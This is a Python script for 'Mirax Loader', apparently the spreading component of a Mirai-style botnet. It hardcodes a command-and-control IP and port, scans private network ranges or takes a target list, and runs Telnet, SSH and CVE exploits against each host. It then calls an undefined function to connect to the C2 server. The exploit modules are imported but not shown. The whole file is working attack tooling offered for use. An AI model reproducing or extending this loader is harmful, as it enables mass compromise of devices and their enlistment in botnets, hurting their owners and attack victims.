#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import threading
import random
import ipaddress
import subprocess
import json
from datetime import datetime

# ==================== CONFIG ====================
C2_HOST = "85.11.167.41"
C2_PORT = 1337
HTTP_HOST = "85.11.167.41"
HTTP_PORT = 8080

# ==================== COLORS ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DIM = '\033[90m'
    RESET = '\033[0m'

# ==================== BANNER ====================
BANNER = f"""
{Colors.CYAN}
         ▄▄        ▄ 
        ▐░░▌      ▐░▌
        ▐░▌░▌     ▐░▌
        ▐░▌▐░▌    ▐░▌
        ▐░▌ ▐░▌   ▐░▌   {Colors.WHITE}𝑴𝑰𝑹𝑨𝑿 𝑳𝑶𝑨𝑫𝑬𝑹 {Colors.CYAN}
        ▐░▌  ▐░▌  ▐░▌
        ▐░▌   ▐░▌ ▐░▌
        ▐░▌    ▐░▌▐░▌   
        ▐░▌     ▐░▐░▌
        ▐░▌      ▐░░▌
         ▀        ▀▀ 
             
{Colors.RESET}"""

# ==================== MAIN LOADER ====================
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    print(f"{Colors.CYAN}[+] Mirax Loader v1.0{Colors.RESET}")
    print(f"{Colors.DIM}[+] C2: {C2_HOST}:{C2_PORT}{Colors.RESET}")
    print(f"{Colors.DIM}[+] HTTP: {HTTP_HOST}:{HTTP_PORT}{Colors.RESET}")
    print()

    # Import scanner and exploits
    from scanner import Scanner
    from exploit_telnet import TelnetExploit
    from exploit_ssh import SSHExploit
    from exploit_cve import CVEExploit

    scanner = Scanner()
    telnet = TelnetExploit()
    ssh = SSHExploit()
    cve = CVEExploit()

    # Load targets
    targets = []
    if len(sys.argv) > 1:
        if sys.argv[1].endswith('.txt'):
            with open(sys.argv[1], 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        else:
            targets = [sys.argv[1]]
    else:
        # Default scan ranges
        ranges = ['192.168.1.0/24', '10.0.0.0/24', '172.16.0.0/24']
        for r in ranges:
            targets.extend(scanner.scan_network(r))

    if not targets:
        print(f"{Colors.RED}[!] No targets found{Colors.RESET}")
        sys.exit(1)

    print(f"{Colors.CYAN}[*] Loaded {len(targets)} targets{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Starting exploitation...{Colors.RESET}\n")

    exploited = []
    for target in targets[:100]:
        print(f"{Colors.DIM}[*] Trying {target}{Colors.RESET}", end='\r')

        # Try different exploits
        if telnet.exploit(target):
            print(f"{Colors.GREEN}[+] {target} exploited via Telnet{Colors.RESET}")
            exploited.append(target)
        elif ssh.exploit(target):
            print(f"{Colors.GREEN}[+] {target} exploited via SSH{Colors.RESET}")
            exploited.append(target)
        elif cve.exploit(target):
            print(f"{Colors.GREEN}[+] {target} exploited via CVE{Colors.RESET}")
            exploited.append(target)

    print(f"\n{Colors.GREEN}[+] Exploited {len(exploited)} devices{Colors.RESET}")

    # Connect to C2
    connect_c2()

if __name__ == '__main__':
    main()